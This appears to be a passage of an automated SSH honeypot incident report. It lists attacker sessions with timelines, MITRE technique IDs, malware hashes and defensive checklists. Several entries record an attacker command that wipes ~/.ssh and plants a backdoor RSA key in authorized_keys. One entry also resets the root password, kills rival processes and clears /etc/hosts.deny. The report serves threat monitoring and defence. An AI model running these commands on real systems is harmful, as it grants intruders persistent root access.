| `2026-05-22 04:54:27` | `cowrie.command.input` |
| `2026-05-22 04:54:27` | `cowrie.log.closed` |
| `2026-05-22 04:54:29` | `cowrie.session.params` |
| `2026-05-22 04:54:29` | `cowrie.command.input` |
| `2026-05-22 04:54:31` | `cowrie.session.file_download` |
| `2026-05-22 04:54:31` | `cowrie.log.closed` |
| `2026-05-22 04:54:33` | `cowrie.session.params` |
| `2026-05-22 04:54:33` | `cowrie.command.input` |
| `2026-05-22 04:54:35` | `cowrie.log.closed` |
| `2026-05-22 04:54:37` | `cowrie.session.params` |
| `2026-05-22 04:54:37` | `cowrie.command.input` |
| `2026-05-22 04:54:37` | `cowrie.log.closed` |
| `2026-05-22 04:54:38` | `cowrie.session.params` |
| `2026-05-22 04:54:38` | `cowrie.command.input` |
| `2026-05-22 04:54:38` | `cowrie.command.input` |
| `2026-05-22 04:54:38` | `cowrie.log.closed` |
| `2026-05-22 04:54:39` | `cowrie.session.params` |
| `2026-05-22 04:54:39` | `cowrie.command.input` |
| `2026-05-22 04:54:39` | `cowrie.log.closed` |
| `2026-05-22 04:54:41` | `cowrie.session.params` |
| `2026-05-22 04:54:41` | `cowrie.command.input` |
| `2026-05-22 04:54:42` | `cowrie.log.closed` |
| `2026-05-22 04:54:44` | `cowrie.session.params` |
| `2026-05-22 04:54:44` | `cowrie.command.input` |
| `2026-05-22 04:54:45` | `cowrie.log.closed` |
| `2026-05-22 04:54:48` | `cowrie.session.params` |
| `2026-05-22 04:54:48` | `cowrie.command.input` |
| `2026-05-22 04:54:48` | `cowrie.log.closed` |
| `2026-05-22 04:54:49` | `cowrie.session.params` |
| `2026-05-22 04:54:49` | `cowrie.command.input` |
| `2026-05-22 04:54:49` | `cowrie.log.closed` |
| `2026-05-22 04:54:57` | `cowrie.session.params` |
| `2026-05-22 04:54:57` | `cowrie.command.input` |
| `2026-05-22 04:54:57` | `cowrie.log.closed` |
| `2026-05-22 04:54:58` | `cowrie.session.params` |
| `2026-05-22 04:54:58` | `cowrie.command.input` |
| `2026-05-22 04:54:58` | `cowrie.log.closed` |
| `2026-05-22 04:54:59` | `cowrie.session.params` |
| `2026-05-22 04:54:59` | `cowrie.command.input` |
| `2026-05-22 04:54:59` | `cowrie.log.closed` |
| `2026-05-22 04:55:00` | `cowrie.session.params` |
| `2026-05-22 04:55:00` | `cowrie.command.input` |
| `2026-05-22 04:55:01` | `cowrie.log.closed` |
| `2026-05-22 04:55:03` | `cowrie.session.params` |
| `2026-05-22 04:55:03` | `cowrie.command.input` |
| `2026-05-22 04:55:04` | `cowrie.log.closed` |
| `2026-05-22 04:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e42eb440c2

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:03 |
| **Last Seen** | 2026-05-22 05:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:03:23` | `cowrie.session.connect` |
| `2026-05-22 05:03:23` | `cowrie.client.version` |
| `2026-05-22 05:03:23` | `cowrie.client.kex` |
| `2026-05-22 05:03:24` | `cowrie.login.success` |
| `2026-05-22 05:03:24` | `cowrie.session.params` |
| `2026-05-22 05:03:24` | `cowrie.command.input` |
| `2026-05-22 05:03:24` | `cowrie.command.failed` |
| `2026-05-22 05:03:25` | `cowrie.log.closed` |
| `2026-05-22 05:03:25` | `cowrie.session.params` |
| `2026-05-22 05:03:25` | `cowrie.command.input` |
| `2026-05-22 05:03:25` | `cowrie.session.file_download` |
| `2026-05-22 05:03:25` | `cowrie.log.closed` |
| `2026-05-22 05:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492818037ce6

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:03 |
| **Last Seen** | 2026-05-22 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:03:27` | `cowrie.session.connect` |
| `2026-05-22 05:03:27` | `cowrie.client.version` |
| `2026-05-22 05:03:28` | `cowrie.client.kex` |
| `2026-05-22 05:03:28` | `cowrie.login.success` |
| `2026-05-22 05:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87bd7ce1999e

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]201` |
| **First Seen** | 2026-05-22 05:12 |
| **Last Seen** | 2026-05-22 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:12:38` | `cowrie.session.connect` |
| `2026-05-22 05:12:38` | `cowrie.client.version` |
| `2026-05-22 05:12:38` | `cowrie.client.kex` |
| `2026-05-22 05:12:38` | `cowrie.login.success` |
| `2026-05-22 05:12:38` | `cowrie.session.params` |
| `2026-05-22 05:12:38` | `cowrie.command.input` |
| `2026-05-22 05:12:38` | `cowrie.command.failed` |
| `2026-05-22 05:12:38` | `cowrie.log.closed` |
| `2026-05-22 05:12:38` | `cowrie.session.params` |
| `2026-05-22 05:12:38` | `cowrie.command.input` |
| `2026-05-22 05:12:38` | `cowrie.session.file_download` |
| `2026-05-22 05:12:38` | `cowrie.log.closed` |
| `2026-05-22 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]201` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f939e4ff773c

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]203` |
| **First Seen** | 2026-05-22 05:12 |
| **Last Seen** | 2026-05-22 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:12:39` | `cowrie.session.connect` |
| `2026-05-22 05:12:39` | `cowrie.client.version` |
| `2026-05-22 05:12:39` | `cowrie.client.kex` |
| `2026-05-22 05:12:39` | `cowrie.login.success` |
| `2026-05-22 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]203` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879dfb1a8c79

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:14 |
| **Last Seen** | 2026-05-22 05:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:14:57` | `cowrie.session.connect` |
| `2026-05-22 05:14:57` | `cowrie.client.version` |
| `2026-05-22 05:14:57` | `cowrie.client.kex` |
| `2026-05-22 05:14:58` | `cowrie.login.success` |
| `2026-05-22 05:14:58` | `cowrie.session.params` |
| `2026-05-22 05:14:58` | `cowrie.command.input` |
| `2026-05-22 05:14:58` | `cowrie.command.failed` |
| `2026-05-22 05:14:59` | `cowrie.log.closed` |
| `2026-05-22 05:14:59` | `cowrie.session.params` |
| `2026-05-22 05:14:59` | `cowrie.command.input` |
| `2026-05-22 05:14:59` | `cowrie.session.file_download` |
| `2026-05-22 05:14:59` | `cowrie.log.closed` |
| `2026-05-22 05:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8db67deec2

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:15 |
| **Last Seen** | 2026-05-22 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:15:01` | `cowrie.session.connect` |
| `2026-05-22 05:15:01` | `cowrie.client.version` |
| `2026-05-22 05:15:01` | `cowrie.client.kex` |
| `2026-05-22 05:15:02` | `cowrie.login.success` |
| `2026-05-22 05:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd6b519393c

| Field | Detail |
|---|---|
| **Source IP** | `112.28.130[.]136` |
| **First Seen** | 2026-05-22 05:15 |
| **Last Seen** | 2026-05-22 05:16 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OgckSSKP4Bpg"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:15:53` | `cowrie.session.connect` |
| `2026-05-22 05:15:53` | `cowrie.client.version` |
| `2026-05-22 05:15:53` | `cowrie.client.kex` |
| `2026-05-22 05:15:54` | `cowrie.login.success` |
| `2026-05-22 05:15:54` | `cowrie.session.params` |
| `2026-05-22 05:15:54` | `cowrie.command.input` |
| `2026-05-22 05:15:54` | `cowrie.command.failed` |
| `2026-05-22 05:15:55` | `cowrie.log.closed` |
| `2026-05-22 05:15:55` | `cowrie.session.params` |
| `2026-05-22 05:15:55` | `cowrie.command.input` |
| `2026-05-22 05:15:55` | `cowrie.session.file_download` |
| `2026-05-22 05:15:55` | `cowrie.log.closed` |
| `2026-05-22 05:16:09` | `cowrie.session.params` |
| `2026-05-22 05:16:09` | `cowrie.command.input` |
| `2026-05-22 05:16:09` | `cowrie.log.closed` |
| `2026-05-22 05:16:09` | `cowrie.session.params` |
| `2026-05-22 05:16:09` | `cowrie.command.input` |
| `2026-05-22 05:16:09` | `cowrie.log.closed` |
| `2026-05-22 05:16:10` | `cowrie.session.params` |
| `2026-05-22 05:16:10` | `cowrie.command.input` |
| `2026-05-22 05:16:10` | `cowrie.session.file_download` |
| `2026-05-22 05:16:10` | `cowrie.log.closed` |
| `2026-05-22 05:16:10` | `cowrie.session.params` |
| `2026-05-22 05:16:10` | `cowrie.command.input` |
| `2026-05-22 05:16:11` | `cowrie.log.closed` |
| `2026-05-22 05:16:11` | `cowrie.session.params` |
| `2026-05-22 05:16:11` | `cowrie.command.input` |
| `2026-05-22 05:16:11` | `cowrie.log.closed` |
| `2026-05-22 05:16:12` | `cowrie.session.params` |
| `2026-05-22 05:16:12` | `cowrie.command.input` |
| `2026-05-22 05:16:12` | `cowrie.command.input` |
| `2026-05-22 05:16:12` | `cowrie.log.closed` |
| `2026-05-22 05:16:12` | `cowrie.session.params` |
| `2026-05-22 05:16:12` | `cowrie.command.input` |
| `2026-05-22 05:16:12` | `cowrie.log.closed` |
| `2026-05-22 05:16:13` | `cowrie.session.params` |
| `2026-05-22 05:16:13` | `cowrie.command.input` |
| `2026-05-22 05:16:13` | `cowrie.log.closed` |
| `2026-05-22 05:16:13` | `cowrie.session.params` |
| `2026-05-22 05:16:13` | `cowrie.command.input` |
| `2026-05-22 05:16:13` | `cowrie.log.closed` |
| `2026-05-22 05:16:14` | `cowrie.session.params` |
| `2026-05-22 05:16:14` | `cowrie.command.input` |
| `2026-05-22 05:16:14` | `cowrie.log.closed` |
| `2026-05-22 05:16:14` | `cowrie.session.params` |
| `2026-05-22 05:16:14` | `cowrie.command.input` |
| `2026-05-22 05:16:14` | `cowrie.log.closed` |
| `2026-05-22 05:16:15` | `cowrie.session.params` |
| `2026-05-22 05:16:15` | `cowrie.command.input` |
| `2026-05-22 05:16:15` | `cowrie.log.closed` |
| `2026-05-22 05:16:15` | `cowrie.session.params` |
| `2026-05-22 05:16:15` | `cowrie.command.input` |
| `2026-05-22 05:16:16` | `cowrie.log.closed` |
| `2026-05-22 05:16:16` | `cowrie.session.params` |
| `2026-05-22 05:16:16` | `cowrie.command.input` |
| `2026-05-22 05:16:16` | `cowrie.log.closed` |
| `2026-05-22 05:16:17` | `cowrie.session.params` |
| `2026-05-22 05:16:17` | `cowrie.command.input` |
| `2026-05-22 05:16:17` | `cowrie.log.closed` |
| `2026-05-22 05:16:17` | `cowrie.session.params` |
| `2026-05-22 05:16:17` | `cowrie.command.input` |
| `2026-05-22 05:16:17` | `cowrie.log.closed` |
| `2026-05-22 05:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.130[.]136` to AbuseIPDB if not already reported
- [ ] Block `112.28.130[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98684ec6c38

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:18 |
| **Last Seen** | 2026-05-22 05:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:18:58` | `cowrie.session.connect` |
| `2026-05-22 05:18:58` | `cowrie.client.version` |
| `2026-05-22 05:18:58` | `cowrie.client.kex` |
| `2026-05-22 05:18:59` | `cowrie.login.success` |
| `2026-05-22 05:18:59` | `cowrie.session.params` |
| `2026-05-22 05:18:59` | `cowrie.command.input` |
| `2026-05-22 05:18:59` | `cowrie.command.failed` |
| `2026-05-22 05:18:59` | `cowrie.log.closed` |
| `2026-05-22 05:19:00` | `cowrie.session.params` |
| `2026-05-22 05:19:00` | `cowrie.command.input` |
| `2026-05-22 05:19:00` | `cowrie.session.file_download` |
| `2026-05-22 05:19:00` | `cowrie.log.closed` |
| `2026-05-22 05:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0dfae1d86ff

| Field | Detail |
|---|---|
| **Source IP** | `197.156.83[.]94` |
| **First Seen** | 2026-05-22 05:19 |
| **Last Seen** | 2026-05-22 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:19:02` | `cowrie.session.connect` |
| `2026-05-22 05:19:02` | `cowrie.client.version` |
| `2026-05-22 05:19:03` | `cowrie.client.kex` |
| `2026-05-22 05:19:03` | `cowrie.login.success` |
| `2026-05-22 05:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.156.83[.]94` to AbuseIPDB if not already reported
- [ ] Block `197.156.83[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9faa3f4f1e70

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:27 |
| **Last Seen** | 2026-05-22 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:27:14` | `cowrie.session.connect` |
| `2026-05-22 05:27:14` | `cowrie.client.version` |
| `2026-05-22 05:27:14` | `cowrie.client.kex` |
| `2026-05-22 05:27:16` | `cowrie.login.success` |
| `2026-05-22 05:27:16` | `cowrie.session.params` |
| `2026-05-22 05:27:16` | `cowrie.command.input` |
| `2026-05-22 05:27:16` | `cowrie.command.failed` |
| `2026-05-22 05:27:17` | `cowrie.log.closed` |
| `2026-05-22 05:27:17` | `cowrie.session.params` |
| `2026-05-22 05:27:17` | `cowrie.command.input` |
| `2026-05-22 05:27:17` | `cowrie.session.file_download` |
| `2026-05-22 05:27:17` | `cowrie.log.closed` |
| `2026-05-22 05:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3874a9631368

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-05-22 05:27 |
| **Last Seen** | 2026-05-22 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:27:21` | `cowrie.session.connect` |
| `2026-05-22 05:27:21` | `cowrie.client.version` |
| `2026-05-22 05:27:21` | `cowrie.client.kex` |
| `2026-05-22 05:27:22` | `cowrie.login.success` |
| `2026-05-22 05:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca592c07ce5

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]160` |
| **First Seen** | 2026-05-22 05:28 |
| **Last Seen** | 2026-05-22 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:28:38` | `cowrie.session.connect` |
| `2026-05-22 05:28:38` | `cowrie.client.version` |
| `2026-05-22 05:28:38` | `cowrie.client.kex` |
| `2026-05-22 05:28:38` | `cowrie.login.success` |
| `2026-05-22 05:28:38` | `cowrie.session.params` |
| `2026-05-22 05:28:38` | `cowrie.command.input` |
| `2026-05-22 05:28:38` | `cowrie.command.failed` |
| `2026-05-22 05:28:38` | `cowrie.log.closed` |
| `2026-05-22 05:28:38` | `cowrie.session.params` |
| `2026-05-22 05:28:38` | `cowrie.command.input` |
| `2026-05-22 05:28:38` | `cowrie.session.file_download` |
| `2026-05-22 05:28:38` | `cowrie.log.closed` |
| `2026-05-22 05:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.224[.]160` to AbuseIPDB if not already reported
- [ ] Block `40.81.224[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f435655f2c1

| Field | Detail |
|---|---|
| **Source IP** | `40.81.224[.]160` |
| **First Seen** | 2026-05-22 05:28 |
| **Last Seen** | 2026-05-22 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 05:28:39` | `cowrie.session.connect` |
| `2026-05-22 05:28:39` | `cowrie.client.version` |
| `2026-05-22 05:28:39` | `cowrie.client.kex` |
| `2026-05-22 05:28:39` | `cowrie.login.success` |
| `2026-05-22 05:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
